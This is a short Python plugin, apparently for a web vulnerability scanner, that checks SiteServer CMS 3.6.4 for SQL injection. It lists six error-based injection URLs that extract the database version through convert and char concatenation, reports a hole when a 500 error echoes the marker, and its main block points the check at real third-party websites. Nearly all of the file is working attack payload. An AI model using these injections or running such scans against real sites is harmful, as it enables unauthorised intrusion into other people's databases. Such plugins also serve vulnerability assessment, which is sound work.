#!/usr/bin/evn python
#-*-:coding:utf-8 -*-
#Author:404
#Name:siteserver最新版3.6.4 sql inject漏洞大礼包of 1
#Refer:http://www.wooyun.org/corps/%E7%99%BE%E5%AE%B9%E5%8D%83%E5%9F%9F%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF%E5%BC%80%E5%8F%91%E6%9C%89%E9%99%90%E8%B4%A3%E4%BB%BB%E5%85%AC%E5%8F%B8/page/2


def assign(service,arg):
    if service=="siteserver":
        return True,arg 


def  audit(arg):
    ps=[
        'siteserver/service/background_taskLog.aspx?Keyword=test%%27%20and%20convert(int,(char(71)%2Bchar(65)%2Bchar(79)%2Bchar(74)%2Bchar(73)%2B@@version))=1%20and%202=%271&DateFrom=&DateTo=&IsSuccess=All',
        'usercenter/platform/user.aspx?UnLock=sdfe%27&UserNameCollection=test%27)%20and%20char(71)%2Bchar(65)%2Bchar(79)%2Bchar(74)%2Bchar(73)%2B@@version=2;%20--',
        'siteserver/bbs/background_keywordsFilting.aspx?grade=0&categoryid=0&keyword=test%27%20and%20char(71)%2Bchar(65)%2Bchar(79)%2Bchar(74)%2Bchar(73)%2B@@version=1%20and%202=%271',
        'siteserver/userRole/background_administrator.aspx?RoleName=%27%20and%20char(71)%2Bchar(65)%2Bchar(79)%2Bchar(74)%2Bchar(73)%2B@@version=1%20and%201=%271&PageNum=0&Keyword=test&AreaID=0&LastActivityDate=0&Order=UserName',
        'siteserver/userRole/background_user.aspx?PageNum=0&Keyword=%27%20and%20char(71)%2Bchar(65)%2Bchar(79)%2Bchar(74)%2Bchar(73)%2B@@version=1%20and%201=%27&CreateDate=0&LastActivityDate=0&TypeID=0&DepartmentID=0&AreaID=0',
        'siteserver/bbs/background_thread.aspx?UserName=test&Title=%27%20and%201=char(71)%2Bchar(65)%2Bchar(79)%2Bchar(74)%2Bchar(73)%2B@@version%20and%201=%27&DateFrom=&DateTo=&ForumID=0',
        ]
    for p in ps:
        url=arg+p
        code,head,res,errcode,_=curl.curl2(url)
        
        if code==500 and "GAOJIMicrosoft" in res:
            security_hole(url)
        
        
if __name__=="__main__":
    from dummy import *
    audit(assign('siteserver','http://www.plhgyy.com/')[1])
    #audit(assign('siteserver','http://www.zgktws.com/')[1])